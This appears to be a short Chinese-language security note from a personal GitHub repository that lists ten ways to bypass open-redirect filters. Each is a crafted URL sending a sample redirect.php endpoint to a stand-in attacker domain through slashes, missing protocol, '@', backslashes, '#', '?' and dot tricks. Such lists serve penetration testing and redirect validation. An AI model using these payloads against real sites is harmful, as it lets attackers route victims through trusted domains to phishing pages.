# url跳转漏洞bypass总结

> GitHub 仓库源文件：[点击打开网页渲染版](https://github.com/ben2023niao/ben-ops-notes/blob/main/doc/md/202304141557-%E5%AE%89%E5%85%A8%E4%B8%8E%E5%A0%A1%E5%9E%92%E6%9C%BA%2B%E9%AB%98%E7%BA%A7%E5%AE%89%E5%85%A8%2BPHP%2B%E6%BC%8F%E6%B4%9E-url%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9Ebypass%E6%80%BB%E7%BB%93.md)

```
10种bypass方式：

1. 单斜线"/"绕过
https://www.landHYU.me/redirect.php?url=/www.evil.com
2. 缺少协议绕过
https://www.landHYU.me/redirect.php?url=//www.evil.com
3. 多斜线"/"前缀绕过
https://www.landHYU.me/redirect.php?url=///www.evil.com
https://www.landHYU.me/redirect.php?url=////www.evil.com
4. 利用"@"符号绕过
https://www.landHYU.me/redirect.php?url=https://[邮箱已脱敏]
5. 利用反斜线"\"绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com\www.landHYU.me
6. 利用"#"符号绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com#www.landHYU.me
7. 利用"?"号绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com?www.landHYU.me
8. 利用"\\"绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com\\www.landHYU.me
9. 利用"."绕过
https://www.landHYU.me/redirect.php?url=.evil (可能会跳转到www.landHYU.me.evil域名)
https://www.landHYU.me/redirect.php?url=.evil.com (可能会跳转到evil.com域名)
10.重复特殊字符绕过
https://www.landHYU.me/redirect.php?url=///www.evil.com//..
https://www.landHYU.me/redirect.php?url=////www.evil.com//..
```
